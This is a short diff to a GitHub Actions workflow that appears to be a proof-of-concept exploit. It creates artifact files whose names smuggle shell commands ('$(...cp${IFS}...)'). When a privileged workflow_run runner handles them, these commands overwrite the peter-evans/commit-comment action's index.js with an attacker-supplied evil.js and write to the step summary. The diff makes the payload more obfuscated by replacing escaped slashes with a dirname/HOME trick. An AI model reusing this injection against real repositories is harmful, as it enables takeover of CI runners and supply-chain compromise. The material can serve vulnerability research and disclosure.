@@ -16,7 +16,7 @@ jobs:
         run: |
           mkdir -p content
           cd content
-          printf 'RCE_PROOF: injected command executed on the privileged workflow_run runner\n' > summary.txt
+          printf 'RCE_PROOF: injected shell payload executed on the privileged workflow_run runner\n' > summary.txt
           printf '' > rce.txt
           cat > evil.js <<'JS'
           const fs = require('fs');
@@ -39,8 +39,8 @@ jobs:
             console.log(s);
           })();
           JS
-          SUM="rce\$(cp\${IFS}\$'\\057'tmp\$'\\057'content\$'\\057'content\$'\\057'summary.txt\${IFS}\$GITHUB_STEP_SUMMARY).txt"
-          OVR="rce\$(cp\${IFS}\$'\\057'tmp\$'\\057'content\$'\\057'content\$'\\057'evil.js\${IFS}\$'\\057'home\$'\\057'runner\$'\\057'work\$'\\057'_actions\$'\\057'peter-evans\$'\\057'commit-comment\$'\\057'v3\$'\\057'dist\$'\\057'index.js).txt"
+          SUM='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}summary.txt${IFS}$GITHUB_STEP_SUMMARY).txt'
+          OVR='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}evil.js${IFS}${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js).txt'
           touch "$SUM" "$OVR"
           ls -la
       - name: Upload artifact
